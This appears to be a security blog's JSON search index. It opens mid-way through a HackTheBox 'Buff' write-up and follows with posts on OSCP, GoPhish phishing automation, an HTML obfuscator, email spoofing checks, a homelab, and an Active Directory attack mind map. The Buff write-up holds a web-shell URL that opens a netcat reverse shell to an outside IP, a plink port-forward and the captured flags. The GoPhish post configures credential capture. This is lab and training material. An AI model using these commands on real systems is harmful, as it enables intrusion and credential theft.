Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group Mandatory Label\\Medium Mandatory Level Label            S-1-16-8192                                                       PRIVILEGES INFORMATION ----------------------  Privilege Name                Description                          State    ============================= ==================================== ======== SeShutdownPrivilege           Shut down the system                 Disabled SeChangeNotifyPrivilege       Bypass traverse checking             Enabled  SeUndockPrivilege             Remove computer from docking station Disabled SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled SeTimeZonePrivilege           Change the time zone                 Disabled    From here I came to see what is the username..   buff\\shaun S-1-5-21-2277156429-3381729605-2640630771-1001    C:\\xampp\\htdocs\\gym\\upload&gt; type C:\\Users\\shaun\\Desktop\\user.txt �PNG ▒ 5345fe517be93e1b736b12b0267654c2    Now let’s visit the http://buff.htb:8080/upload.php too see anything intresting?      From the image we can see that the shell I got is not that great.. So I moved to gain the shell from the uploaded payload from the URL.       http://buff.htb:8080/upload/kamehameha.php?telepathy=nc 10.10.14.51 5566 -e cmd.exe       Now time to find the Vulnerable Service..   C:\\xampp\\htdocs\\gym\\upload&gt;netstat -an netstat -an  Active Connections    Proto  Local Address          Foreign Address        State   TCP    0.0.0.0:135            0.0.0.0:0              LISTENING   TCP    0.0.0.0:445            0.0.0.0:0              LISTENING   TCP    0.0.0.0:4444           0.0.0.0:0              LISTENING   TCP    0.0.0.0:4545           0.0.0.0:0              LISTENING   TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING   TCP    0.0.0.0:7680           0.0.0.0:0              LISTENING   TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING   TCP    0.0.0.0:9999           0.0.0.0:0              LISTENING   TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING   TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING   TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING   TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING   TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING   TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING   TCP    10.10.10.198:139       0.0.0.0:0              LISTENING   TCP    10.10.10.198:8080      10.10.14.33:37962      ESTABLISHED   TCP    10.10.10.198:8080      10.10.14.41:34394      FIN_WAIT_2   TCP    10.10.10.198:8080      10.10.14.51:58486      CLOSE_WAIT   TCP    10.10.10.198:8080      10.10.14.51:58488      TIME_WAIT   TCP    10.10.10.198:8080      10.10.14.51:58490      ESTABLISHED   TCP    10.10.10.198:50676     10.10.14.33:22         CLOSE_WAIT   TCP    10.10.10.198:50809     10.10.14.33:22         ESTABLISHED   TCP    10.10.10.198:50879     10.10.14.33:22         CLOSE_WAIT   TCP    10.10.10.198:51491     10.10.14.33:6969       ESTABLISHED   TCP    10.10.10.198:51506     10.10.14.33:22         ESTABLISHED   TCP    10.10.10.198:51565     10.10.14.33:1122       ESTABLISHED   TCP    10.10.10.198:53167     10.10.14.51:22         ESTABLISHED   TCP    10.10.10.198:53191     10.10.14.51:5577       ESTABLISHED   TCP    127.0.0.1:3306         0.0.0.0:0              LISTENING   TCP    127.0.0.1:8888         0.0.0.0:0              LISTENING   TCP    127.0.0.1:53175        127.0.0.1:3306         TIME_WAIT   TCP    127.0.0.1:53177        127.0.0.1:3306         TIME_WAIT   TCP    [::]:135               [::]:0                 LISTENING   TCP    [::]:445               [::]:0                 LISTENING   TCP    [::]:7680              [::]:0                 LISTENING   TCP    [::]:8080              [::]:0                 LISTENING   TCP    [::]:49664             [::]:0                 LISTENING   TCP    [::]:49665             [::]:0                 LISTENING   TCP    [::]:49666             [::]:0                 LISTENING   TCP    [::]:49667             [::]:0                 LISTENING   TCP    [::]:49668             [::]:0                 LISTENING   TCP    [::]:49669             [::]:0                 LISTENING   UDP    0.0.0.0:123            *:*                       UDP    0.0.0.0:5050           *:*                       UDP    0.0.0.0:5353           *:*                       UDP    0.0.0.0:5355           *:*                       UDP    0.0.0.0:64168          *:*                       UDP    10.10.10.198:137       *:*                       UDP    10.10.10.198:138       *:*                       UDP    10.10.10.198:1900      *:*                       UDP    10.10.10.198:59086     *:*                       UDP    127.0.0.1:1900         *:*                       UDP    127.0.0.1:58106        *:*                       UDP    127.0.0.1:59087        *:*                       UDP    [::]:123               *:*                       UDP    [::]:5353              *:*                       UDP    [::]:5355              *:*                       UDP    [::]:64168             *:*                       UDP    [::1]:1900             *:*                       UDP    [::1]:59085            *:*                       UDP    [fe80::edcd:7573:f6e:abdb%10]:1900  *:*                       UDP    [fe80::edcd:7573:f6e:abdb%10]:59084  *:*                     Comparing the procress with all the procress details..   C:\\xampp\\htdocs\\gym\\upload&gt;powershell ps powershell ps  Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                                                   -------  ------    -----      -----     ------     --  -- -----------                                                       432      24    18324       9180              6612   1 ApplicationFrameHost                                              161      10     1940       2176              7140   1 browser_broker                                                    237      19    26404      29328              5536   0 CloudMe                                                           286      62    30312        372              6088   0 CloudMe                                                           289      16     2896       2548       0.17   1396   0 CloudMe_1112                                                      269      16     2868        200       0.98   8772   0 CloudMe_1112         This command in PowerShell is used to print what program/process is running. You can see 5536 is the PID of CloudMe software.   This is conformed after finding cloudme is running in Downloads folder of Shaun.   C:\\Users\\shaun\\Downloads&gt;dir dir  Volume in drive C has no label.  Volume Serial Number is A22D-49F7   Directory of C:\\Users\\shaun\\Downloads  23/07/2020  07:58    &lt;DIR&gt;          . 23/07/2020  07:58    &lt;DIR&gt;          .. 23/07/2020  05:35            61,440 nc.exe 23/07/2020  07:56           675,752 plink.exe                3 File(s)     18,568,016 bytes                2 Dir(s)   9,798,672,384 bytes free   Privilege Escalation   So here is the game plan   Port forwarding to expose remote port 8888 (accessible only from localhost) to YOURPORT local   Step 1   Enable sshd service on your kali machine:  sudo systemctl start ssh.socket   Step 2  Use Plink to portforward on your local listener   plink.exe -v -x -a -T -C -noagent -ssh -pw {Password} -R {Your_Port}:127.0.0.1:8888 user@{IP_address}   If every thing works correctly.. You should see this ..      CloudMe 1.11.2 -CVE – Administrator:   Exploit for CloudMe 1.11.2: https://www.exploit-db.com/exploits/48389   The shellcode should be changed in order to get the reverse shell.     Note:    Use some higher port in order to get the reverse shell perfectly, cause there are so many people bashing the same machine at same time.    you should see this if the exploit runs correctly.      Once Every this is set and run properly then you should be good to get the reverse shell and grab the Root.txt   nc -lnvp 60000 listening on [any] 60000 ... connect to [10.10.14.51] from (UNKNOWN) [10.10.10.198] 49723 Microsoft Windows [Version 10.0.17134.1550] (c) 2018 Microsoft Corporation. All rights reserved.  C:\\Windows\\system32&gt;   Getting Root.txt   C:\\Windows\\system32&gt;cd C:\\Users\\Administrator\\Desktop cd C:\\Users\\Administrator\\Desktop  C:\\Users\\Administrator\\Desktop&gt;type root.txt type root.txt 2e881649240e8868c48daee707659212  C:\\Users\\Administrator\\  If you like my work, please do consider giving me +rep on HACKTHEBOX.   My HackTheBox profile: https://www.hackthebox.eu/home/users/profile/291968  ","categories": ["hackthebox"],
        "tags": ["windows,","cve,","portforwarding"],
        "url": "/hackthebox/Buff/",
        "teaser": "/assets/img/sample/buff/buff.png"
      },{
        "title": "My  journey  towards  \"TRY  HARDER!\"",
        "excerpt":"  OverView  It was one and half years ago I completed my C|EH certification. Since then my only aim was to gain my OSCP no matter what it takes from me. I was ready to give my complete effort and dedication in order to gain my OSCP. This blog outlines my journey towards OSCP and I’ll be sharing some hints and guidelines at the end of the blog which can be helpful in gaining your OSCP as well.     Background  Before I get started my journey towards OSCP, I am a computer science student, finished my master’s degree. But had no experience in the field of cyber security. I strongly had a passion towards security and precisely towards breaking into things. This is all the mind set required in cyber security industry. My first intension was to get my C|EH, but it has not satisfied me and I wanted more of it. Then I’ve taken OSCP as a challenge to myself and the journey begins now.     The Journey   This journey started about 9 months ago, I took the VIP subscription from Hack The Box and started to hack into some retired easy machines to gain some skill and confidence. But the situation was quite difficult for me and I was unable to get even an initial foothold of any machine. However, within a short period, I was able to get the easy machines pawned. Once I gained confidence in cracking the machines, I slowly moved towards the Active Machines section. Within a period of 3 months I had all the easy and medium machine owned.  By the time of 6 months after starting HTB, I almost had about 50+ machines owned. I had also completed the TJNULL’s OSCP machines list. At this point, I was pretty confident that I’m ready for my OSCP exam.     The Plan   Once I gained confidence, I felt like I’m ready for the battle. I came to know that there are 60+ machines in the OSCP lab. My idea was to go with 2 months of lab time and hack into at least 40+ machines. I started my lab access on 2-8-20 and by the time of 1-10-20 I have done 54 machines, which I didn’t expect.     First Month   In the beginning, I was given the access with credentials to log into the forums and the VPN to get connected to their network. The guide lines were straight forward and the map to hack the lab machines was quite interesting to me. This interested me more in doing a lot of machines and I strongly had a feeling that I’m going to learn a lot of things in this two months of my journey. I started to read the material provided my Offensive Security for 3 days and trying to complete a few machines if possible. The material consists of really good content and the videos were a lot helpful.   Second Month   I was pretty much fed up with doing scans manually as it is wasting a lot of my time, then I had to move towards automation. I have written my own scripts to automate the scans to make my work much easier. This way I learned a lot of coding and kind of automating. Slowly I was able to complete the top 5 machines, which made me feel awesome. Slowly the time passed by and now the fun part begins. At this point I almost had all the individual machines compromised and while tackling with the other machines, I was not able to get anything out of these machines. Looking out from the forums I understood that some machines have dependencies and some machines have a chain of dependencies. It took me a lot of time in understanding the dependencies and mapping it from one machine to the other. The overall journey in the lab time was frustrating and fun, I could never forget this ever.     Before Exam   I have registered the exam after a week to the end of my lab access. I tried to relax myself for the whole week and doing the lab report simultaneously. I was able to successfully complete the lab report within one-week and revisited all the machines that I’ve done in the lab. During this process I had made my own cheat sheet so that I can organize and remember the things well. Trust me this was a life savior. Just the day before the exam I was super nervous, my mind was rushing with different thoughts about the exam and keeping my mind stable and cool was literally not possible. After a good night sleep, I woke up with a fresh mind at 7 am, had my breakfast and took a nice warm shower. It was about two and half hours just before the exam…     The Exam Plan      Had to finish the buffer over flow machine in 2 hours at maximum.  Move to the easiest machine i.e. 10 marks machine and finish it in an hour or two at maximum.  Then tackle with the other two 20 marks machines with in a time of 10 hours maximum.  If all goes in the planned way, I should be still having time for the last 25 marks machine.       The Exam Time  I started my exam at 9:45 am sharp. The guide lines are pretty straightforward and I picked the Buffer overflow machine as my first choice. It took me about 4 hours to solve the machine because of some silly and manual mistakes. Next, I went with the easiest 10 marks machine which took me 15 min to compromise the machine with some change in the exploit code. Though BOF took me 4 hours, I managed to solve the 10 marks machine super quick. So according to the plan I was going in the right direction with time.  Once I knew that I had 35 marks in hand, I took a small break and had my lunch. I got back to my seat at 2:00 pm and started to tackle with one of the 20 marks machine. An hour and half later I’m able to get the initial foothold of the machine. I tried harder for so much time to compromise the machine completely, but no luck after a really long time. Then I moved on to the other 20 marks and tried hitting the machine for a really long time, but unable to get even an initial foothold out of it.   The time passed by really quick and now the time is 9:00 pm, but still nothing. Realizing that I need to calm down myself, I took a straight 2 hours of break and I spend some time with my parents and felt much better. I had a feeling that I’m going in a wrong loop and I had to break it. This thing is a game changer, I reverted the machine and started it from the beginning. Once the mind is clear and cool, the ideas are rushing in my head and my methodology worked fantastic in gaining the privileged access of the machine. My excitement was to peaks. By the time of 01:00 am, I was having 55 marks in my hand. I was so exhausted at this point, so I went for a quick powernap and headed my way again.   Knowing that I already had 55 marks, now all I need is 15 marks more to clear the exam. So, I started to tackle the other 20 marks machine. Within no time I was able to get the root access of the machine. At this point I had 75 marks, which is sufficient to pass the exam and now the time is around 03:00 am. Now my plan of action is to reset all the 4 machines and start them from the beginning and take screenshots of each and every step possible as screen recording is not possible now. By the time of 06:00 am, I had my screenshots ready. I took another 2 hours to verify all the things and confirm all are fine, I ended my exam at 08:00 am. Oh YES! But wait, the battle has not ended yet.   The Report   It took me 5+ hours to complete the professional exam report and I submitted it with in 24 hours span of time. YES! The battle has finished and now I need to wait for the results to be positive with fingers crossed.     The Output   It took some where about 3-5 days to get a mail from Offensive Security stating that you have successfully completed the Penetration Testing with Kali Linux certification exam and have obtained your Offensive Security Certified Professional (OSCP) certification. This is the moment of truth, I have been craving for months. Now I’m an OSCP, which I’m so proud of.         Tips and Tricks      Two to three months of HackTheBox and Ippsec’s videos    Yes! You definitely need a prior understanding how things work. The best way to learn is to start from the easy machines in HTB, then keep improving yourself.   Easy rated vulnhub machines.    Try to do as many boxes from vulnhub. once the machine is exploited, try to replicate the same vulnerability that you have exploited from the machine on a new machine. Doing so will teach you a lot of stuff.   The TJNULL’s List of OSCP like machines.     As I was talking about it before, once you think you gained confidence doing HTB and Vulnhub machines you can make a mock exam, like taking a few machines from the list and trying to complete them in a time constraint.   Take help from forums and Communities.    Yes! Take help from forums and other communities. There are really good people who can help you out in some way or the other way.   The Cheat Sheets.    This might be funny but trust me, look at the cheat sheets available on google. There are plenty of them where you can find most of the stuff that is required for OSCP and beyond. Read the cheat sheet daily as if you are reading a newspaper every day. This will help you.   Last but not the least.     Use GOOGLE to figure out the things that you have no idea about, even if it is small thing. Using the keywords properly with the help of google will solve your most of your problems.      The Final Touch   I hope that you liked my blog and this blog might help the other who are aiming for their OSCP. In the end I wanted to say that this has been a wonderful journey to me.  ","categories": ["otherposts"],
        "tags": ["OSCP,","TryHarder"],
        "url": "/otherposts/OSCP/",
        "teaser": "/assets/img/sample/oscp1.png"
      },{
        "title": "GoAutoPhish",
        "excerpt":"Automating Phishing Campaigns with GoPhish: A Complete Guide   Introduction   In the realm of cybersecurity assessment, phishing simulations play a crucial role in evaluating and improving an organization’s security awareness. Today, we’ll explore a powerful automation tool that streamlines the process of creating and managing phishing campaigns using GoPhish’s API. The GoPhish-Automation project offers a robust solution for security professionals looking to enhance their phishing simulation capabilities.   Understanding GoPhish Automation   GoPhish Automation is a Python-based project that simplifies the creation and management of phishing campaigns. By leveraging the GoPhish API, it automates template management, sending profiles, and campaign creation while incorporating advanced features like error handling, custom headers, and rate limiting.   Project Structure   The project follows a clean, organized structure:   /GoPhish-Automation/ │ ├── /templates/ │   ├── template1.txt │   ├── template2.txt │   └── template3.txt │ ├── /logs/ │   └── phishing_campaign.log │ ├── config.json │ └── configauto.py   Key Components      Templates Directory: Stores email templates in text format   Logs Directory: Contains campaign execution logs   Configuration File: Manages campaign settings and credentials   Main Script: Handles the automation logic   Setting Up the Environment   Prerequisites   Before diving in, ensure you have:      Python 3.x installed   A running GoPhish server   GoPhish API key   Basic understanding of phishing campaigns   Installation Steps      Clone the repository:     git clone https://github.com/DcodeZero/Gophish-Automation.git cd Gophish-Automation           Install required packages:     pip install gophish           Configuration Deep Dive   The config.json file is the heart of the configuration. Here’s a detailed breakdown:   {   \"api_key\": \"your_api_key_here\",   \"host\": \"https://your_gophish_server_url\",   \"template\": {     \"is_base64\": false,     \"send_all_types\": false   },   \"smtp_profiles\": [     {       \"name\": \"Profile1\",       \"host\": \"smtp.example.com\",       \"from_address\": \"phish@example.com\",       \"username\": \"user1\",       \"password\": \"password1\",       \"ignore_cert_errors\": true,       \"headers\": [         {\"key\": \"X-Header\", \"value\": \"Foo Bar\"}       ]     }   ],   \"group\": {     \"name\": \"Phishing Group\",     \"targets\": [       {         \"email\": \"target1@example.com\",         \"first_name\": \"John\",         \"last_name\": \"Doe\"       }     ]   },   \"landing_page\": {     \"name\": \"Phishing Page\",     \"html\": \"base64_encoded_html_here\",     \"is_base64\": true,     \"capture_credentials\": true,     \"capture_passwords\": true   } }   Configuration Components      API Configuration            API key authentication       GoPhish server host URL           Template Settings            Base64 encoding options       Multiple template type support           SMTP Profiles            Email server configurations       Custom header support       Certificate handling           Target Groups            Target recipient management       Personalization options           Landing Pages            HTML content configuration       Credential capture settings           Creating Email Templates   Templates are stored in .txt files with a specific format:   Subject: Your Compelling Subject Line HTML: &lt;html&gt; &lt;body&gt; &lt;p&gt;Dear {FIRST_NAME},&lt;/p&gt; &lt;p&gt;Your phishing content here...&lt;/p&gt; &lt;/body&gt; &lt;/html&gt;   Template Best Practices      Use variables for personalization   Structure HTML properly   Include both plain text and HTML versions   Test templates before deployment   Advanced Features   1. Error Handling and Logging  try:     # Campaign operation     log.info(\"Campaign created successfully\") except Exception as e:     log.error(f\"Campaign creation failed: {str(e)}\")   2. Rate Limiting  def send_campaign(profile, delay=60):     time.sleep(delay)     # Campaign sending logic   3. Custom Headers  headers = [     {\"key\": \"X-Priority\", \"value\": \"1\"},     {\"key\": \"X-Custom\", \"value\": \"Value\"} ]   Campaign Execution   Running the automation is straightforward:   python AutoGoPhish.py   The script performs:      Template validation and processing   SMTP profile configuration   Group creation/update   Campaign launch with rate limiting   Comprehensive logging   Monitoring and Logging   The script maintains detailed logs in /logs/phishing_campaign.log:   2024-03-11 10:15:23 INFO: Starting campaign setup 2024-03-11 10:15:24 INFO: Template validated successfully 2024-03-11 10:15:25 INFO: Campaign 'Security Training' launched 2024-03-11 10:15:26 WARNING: Rate limit applied - waiting 60 seconds   Best Practices      Template Management            Regularly update templates       Test with small groups first       Monitor spam score           Rate Limiting            Adjust based on SMTP provider       Monitor delivery rates       Implement progressive delays           Error Handling            Monitor logs regularly       Set up alerts for failures       Maintain backup configurations           Security Considerations      API Key Protection            Store securely       Rotate regularly       Use environment variables           SMTP Security            Use encryption       Implement SPF/DKIM       Monitor for abuse           Data Protection            Encrypt sensitive data       Clean up after campaigns       Follow data retention policies           Conclusion   The GoPhish-Automation project significantly streamlines the process of managing phishing campaigns. By automating routine tasks and implementing best practices, security teams can focus on analyzing results and improving security awareness programs.   Resources      GitHub Repository   GoPhish Documentation   Python GoPhish Library     Note: This tool should only be used for legitimate security testing with proper authorization.  ","categories": ["tools"],
        "tags": ["python,","GoPhish"],
        "url": "/tools/GoAuto-Phish/",
        "teaser": "/assets/images/sample/gophish/go-phish.webp"
      },{
        "title": "HTML-Obfuscator",
        "excerpt":"HTML_Obfuscator: A Python Tool for HTML Code Protection   Table of Contents     Introduction   Understanding HTML Obfuscation   Features Overview   Installation Guide   Usage Instructions   Advanced Features   Best Practices   Use Cases   Technical Deep Dive   Conclusion   Introduction   In the world of web development, protecting your HTML source code from unauthorized copying or reverse engineering is increasingly important. HTML_Obfuscator emerges as a powerful Python-based solution that enables developers to obfuscate and de-obfuscate HTML files efficiently, offering both single-file and batch processing capabilities.   Understanding HTML Obfuscation   What is HTML Obfuscation?  HTML obfuscation is the process of transforming readable HTML code into a more complex, harder-to-understand format while maintaining its functionality. This technique helps:      Protect intellectual property   Prevent unauthorized code copying   Make reverse engineering more difficult   Reduce code readability for potential attackers   Why Use HTML_Obfuscator?     Simplicity: Easy-to-use Python interface   Batch Processing: Handle multiple files simultaneously   Reversible: Built-in de-obfuscation capability   Flexibility: Various output options   Performance: Minimal impact on page load times   Features Overview   Core Capabilities     Single File Processing            Obfuscate individual HTML files       Generate protected output files       Maintain original functionality           Batch Processing            Process entire directories       Maintain folder structure       Bulk operation support           De-obfuscation Support            Reverse obfuscation process       Restore original code format       Debug obfuscated files           Installation Guide   Prerequisites  # Required Python version Python 3.x   Setup Process     Clone the repository:     git clone https://github.com/DcodeZero/Html_Obfuscator           Navigate to directory:     cd Html_Obfuscator           Usage Instructions   Basic Commands  # Single file obfuscation python html_obfuscator.py -oF input.html -o output.html  # Directory processing python html_obfuscator.py -oD -P /path/to/directory -O /output/directory  # De-obfuscation python html_obfuscator.py -dF input.html -o output.html   Command Line Arguments  | Argument | Description | Example | |———-|————-|———| | -oF | Obfuscate single file | -oF input.html | | -oD | Obfuscate directory | -oD | | -dF | De-obfuscate file | -dF obfuscated.html | | -dD | De-obfuscate directory | -dD | | -p | Path to input file | -p /path/to/file | | -P | Path to input directory | -P /path/to/dir | | -o | Output file path | -o output.html | | -O | Output directory path | -O /output/dir |   Advanced Features   Customization Options     Obfuscation Levels            Basic encoding       Advanced scrambling       Custom patterns           Output Formatting            Minification options       Whitespace handling       Comment preservation           Batch Processing Controls            File filtering       Directory recursion       Error handling           Best Practices   When Obfuscating     Backup Original Files            Keep original versions safe       Document obfuscation parameters       Maintain version control           Testing            Verify functionality post-obfuscation       Check browser compatibility       Validate user experience           Performance Considerations            Monitor file size changes       Check load time impact       Optimize when necessary           Use Cases   Development Scenarios     Commercial Projects            Protect proprietary code       Secure client deliverables       Maintain competitive advantage           Educational Platforms            Protect assessment content       Secure learning materials       Prevent solution sharing           Enterprise Applications            Secure internal tools       Protect company assets       Maintain code confidentiality           Technical Deep Dive   Obfuscation Process  graph LR     A[Input HTML] --&gt; B[Parser]     B --&gt; C[Transformer]     C --&gt; D[Encoder]     D --&gt; E[Output HTML]   Code Examples   Simple Obfuscation  # Basic file obfuscation python html_obfuscator.py -oF -p index.html -o protected.html   Batch Processing  # Process entire website python html_obfuscator.py -oD -P ./website -O ./protected-site   Performance Metrics                  Operation       Average Time       File Size Impact                       Single File       &lt; 1 second       +5-15%                 Directory (10 files)       2-3 seconds       +10-20%                 De-obfuscation       &lt; 1 second       Original size           Security Considerations   Protection Level     Basic obfuscation suitable for most use cases   Additional security layers recommended for sensitive applications   Regular updates to obfuscation patterns advised   Limitations     Not a replacement for server-side security   May impact page load performance   Debug capabilities might be affected   Troubleshooting Guide   Common Issues     File Processing Errors            Check file permissions       Verify file paths       Ensure valid HTML input           Output Problems            Verify output directory exists       Check disk space       Validate file access rights           Conclusion   HTML_Obfuscator provides a robust solution for protecting HTML source code through obfuscation. Its combination of ease of use, batch processing capabilities, and reversible operations makes it an invaluable tool for developers looking to secure their web assets while maintaining functionality.   Resources   Documentation     Official Repository   Issue Tracker   Community     Report bugs through GitHub Issues   Contribute improvements via Pull Requests   Share experiences in Discussions     Note: Regular updates and community feedback help improve tool effectiveness and security.  ","categories": ["tools"],
        "tags": ["python"],
        "url": "/tools/HTML-Obfuscator/",
        "teaser": "/assets/images/sample/html-obfs/html-obfs.jpg"
      },{
        "title": "SpoofCheck.py",
        "excerpt":"Spoofcheck: Your First Line of Defense Against Email Domain Spoofing   Introduction  In today’s digital landscape, email security remains a critical concern for organizations of all sizes. Email spoofing attacks, where malicious actors impersonate legitimate domains to conduct phishing campaigns or business email compromise (BEC) attacks, continue to pose a significant threat. Enter Spoofcheck, a powerful open-source tool designed to help security professionals identify and prevent domain spoofing vulnerabilities.   link  SpoofCheck.py   What is Spoofcheck?  Spoofcheck is a security assessment tool that analyzes domain configurations to determine their vulnerability to email spoofing attempts. By examining various email authentication protocols and security measures, it provides valuable insights into potential security gaps that could be exploited by attackers.   Why Domain Spoofing Matters  The Real-World Impact  Email spoofing can lead to several serious consequences:     Financial losses through BEC attacks   Damage to brand reputation   Loss of customer trust   Data breaches through successful phishing attempts   Regulatory compliance issues   Key Features  Spoofcheck helps organizations by:     Identifying missing or misconfigured email authentication records   Detecting vulnerabilities in domain configurations   Providing actionable insights for security improvements   Offering a simple way to verify email security posture   Understanding Email Authentication  To appreciate Spoofcheck’s importance, it’s crucial to understand the key email authentication protocols it examines:   SPF (Sender Policy Framework)  SPF records specify which mail servers are authorized to send emails on behalf of your domain. Proper SPF configuration is essential for:     Preventing unauthorized email sending   Reducing spam from your domain   Improving email deliverability   DKIM (DomainKeys Identified Mail)  DKIM adds a digital signature to emails, ensuring:     Message integrity   Sender authentication   Protection against tampering   DMARC (Domain-based Message Authentication, Reporting, and Conformance)  DMARC builds upon SPF and DKIM by:     Providing clear policies for handling authentication failures   Offering reporting capabilities   Enabling domain-wide email protection   Best Practices for Using Spoofcheck   1. Regular Testing     Conduct monthly security assessments   Test after any DNS changes   Verify configurations across all subdomains   2. Response Planning     Document findings and vulnerabilities   Develop remediation plans   Implement security improvements promptly   3. Integration with Security Workflows     Include in security audits   Add to penetration testing procedures   Incorporate into compliance checks   Implementation Guide   Getting Started     Install the tool   Configure your testing environment   Run initial domain checks   Review and analyze results   Implement necessary changes   Common Issues and Solutions                  Issue       Impact       Solution                       Missing SPF Record       High       Create and implement SPF record                 Weak DMARC Policy       Medium       Strengthen DMARC policy settings                 Incomplete DKIM       High       Configure DKIM signing for all mail streams           Advanced Usage Tips     Automate regular checks   Monitor for configuration changes   Integrate with existing security tools   Track improvements over time   Security Considerations  When using Spoofcheck, remember to:     Keep the tool updated   Use in conjunction with other security measures   Follow security best practices   Document all findings and changes   Conclusion  In an era where email-based attacks are becoming increasingly sophisticated, tools like Spoofcheck play a crucial role in maintaining robust email security. By regularly assessing your domain’s vulnerability to spoofing attempts, you can protect your organization from potentially devastating attacks and maintain the trust of your stakeholders.   Resources for Further Reading     Email Authentication Standards Documentation   Anti-Phishing Working Group Guidelines   NIST Email Security Recommendations   Industry Best Practices for Email Security     Remember: Email security is not a one-time task but an ongoing process. Regular assessment and updates are key to maintaining strong protection against spoofing attempts.  ","categories": ["tools"],
        "tags": ["python,","Go-lang"],
        "url": "/tools/spoofcheck/",
        "teaser": "/assets/images/sample/spoof-check/spoofing.jpg"
      },{
        "title": "HomeLab Part-01 [The Server]",
        "excerpt":"Why I chose Proxmox-VE over other Hypervisors   The Hardware side of things   It’s been quite some time I’ve been using a Enterprise level server HP-Proliant  DL-380-G7 for my home lab. I got the barebones hardware for about 350 dollars, which has only 32 gigs of ram initially. Later I’ve upgraded the RAM to 128 GB for an other  220 dollars, which sums up to 570 USD.      This server has dual Intel(R) Xeon(R) CPU X5650 which clocks @ 2.67GHz. These are pretty powerful and can easily satisfy my requirements to run my HomeLab infrastructure.   Server configuration      Coming to the hypervisor, I tried between multiple like VMware EXSI, Microsoft Hyper-V, Linux Server, Vmware, Virtaul Box and finally settled with Proxmox-VE. However Setting up Proxmox-VE is straight forwarded stuff. So I’m not going to show how to install steps or setup process. There are a ton of videos and blogs that show the same thing.   Why choose Proxmox-VE over others?   These are some advantages that I personally feel that are best for my use case. Remember your use case can be different.      Free and Open Source: Proxmox VE is free with no licensing fees, and has strong community support.   All-in-One Solution: Supports both virtual machines (KVM) and containers (LXC), giving you flexibility for different workloads.   User-Friendly Web Interface: Easy-to-use web-based management console for managing VMs, containers, storage, and networking.   Powerful Storage Options: Supports local storage, NFS, iSCSI, Ceph, and ZFS for flexible and robust storage configurations.   High Availability (HA) and Clustering: Easily create clusters of multiple nodes for scalability and automatic failover in case of hardware failure.   Built-in Backup and Restore: Simple backup and restore tools, with support for live backups of VMs and containers.   Advanced Networking Features: Includes support for VLANs, bridges, and virtual switches for complex networking setups.   Security: Features like role-based access control (RBAC), firewalls, and VPN support to secure your virtual environment.   Scalable and Flexible: Add more nodes to your cluster as needed, with efficient resource management.   Cross-Platform Support: Run both Linux and Windows VMs with full hardware virtualization (KVM).   Cost-Effective: Proxmox VE is low-cost compared to other enterprise solutions like VMware and Hyper-V, with no hidden fees.   The Storage   I chose to have multiple disks for my Proxmox-VE.      1-TB-SSD This is where all the faster and quicker VM are going to be.       2x-500GB-SATA in which       1x-500GB-Sata is going to be used for Slower Virtual machines       1x-500GB-Sata is used to store all the required ISO files.    Well thats okay! So what about the backup and storage part of the story?   Well to answer this, I’ve a built a dedicated NAS-Storage which has 2x-2-TB Drives in it and runs on OpenMediaVault. This build completely serves my purpose from storing my personal and Virtual machines.   I’ve automated the backup process from my Proxmox to NAS-Storage with the help of Raspberry-Pi-3B (runs 24/7).   How many Virtual machines can be run with the above configuration?   Well the answer is how much of RAM and Procressors are allocated to each machine or VM. So assume you are allocating 4-Gigs of ram for each VM you are using. you can divide it with the total amount of ram you have.   In my case I’ve 128-Gigs. So, if I allocate 4-gigs of ram to each VM, then I can run 20-25 VMs with out any compromise or stressing the hardware.   Below is a snip of the number of VM’s that run on the Proxmox-VE host.      This is the summary of my Proxmox-VE, which shows the consumption of both CPUs and RAM utilisation.      In the next blog, I’ll be showing how to setup the network configurations on Proxmox-VE. So stay tuned for it.  ","categories": ["IT"],
        "tags": ["HomeLab","IT","Infra","Infrastructure"],
        "url": "/it/Homelab/",
        "teaser": "/assets/images/sample/homelab/Homelab.jpg"
      },{
        "title": "Mind Map for Active Directory - Pentesting",
        "excerpt":"Active Directory MindMap For Beginers:    graph TB; A[AD Security Assessment] --&gt; B[Assume Breach]; A --&gt; C[External Assessment]; B --&gt; D[Domain Enumeration]; B --&gt; E[Privilege Analysis]; B --&gt; F[Attack Paths]; D --&gt; D1[ACL Analysis]; D1 --&gt; D1A[Bloodhound]; D1 --&gt; D1B[PowerView]; D --&gt; D2[Trust Relationships]; D2 --&gt; D2A[Inter-realm trusts]; D2 --&gt; D2B[Forest trusts]; D --&gt; D3[Service Discovery]; D3 --&gt; D3A[MSSQL]; D3 --&gt; D3B[Exchange]; D3 --&gt; D3C[ADFS]; E --&gt; E1[Group Memberships]; E1 --&gt; E1A[Nested Groups]; E1 --&gt; E1B[Local Admins]; E --&gt; E2[Service Accounts]; E2 --&gt; E2A[Constrained Delegation]; E2 --&gt; E2B[Unconstrained Delegation]; E --&gt; E3[Shadow Admins]; E3 --&gt; E3A[DCSync Rights]; E3 --&gt; E3B[WriteDACL]; F --&gt; F1[Tiered Access]; F1 --&gt; F1A[Workstation to Server]; F1 --&gt; F1B[Server to DC]; F --&gt; F2[Lateral Movement]; F2 --&gt; F2A[Pass-the-Hash]; F2 --&gt; F2B[Pass-the-Ticket]; F --&gt; F3[Certificate Abuse]; F3 --&gt; F3A[ESC1-8]; F3 --&gt; F3B[ADCS]; C --&gt; G[External Recon]; C --&gt; H[Initial Access Vectors]; C --&gt; I[Post Compromise]; G --&gt; G1[Domain Discovery]; G1 --&gt; G1A[DNS Enumeration]; G1 --&gt; G1B[Subdomain Scanning]; G --&gt; G2[Service Enumeration]; G2 --&gt; G2A[VPN Endpoints]; G2 --&gt; G2B[Mail Servers]; G2 --&gt; G2C[Web Applications]; G --&gt; G3[OSINT]; G3 --&gt; G3A[Email Formats]; G3 --&gt; G3B[Employee 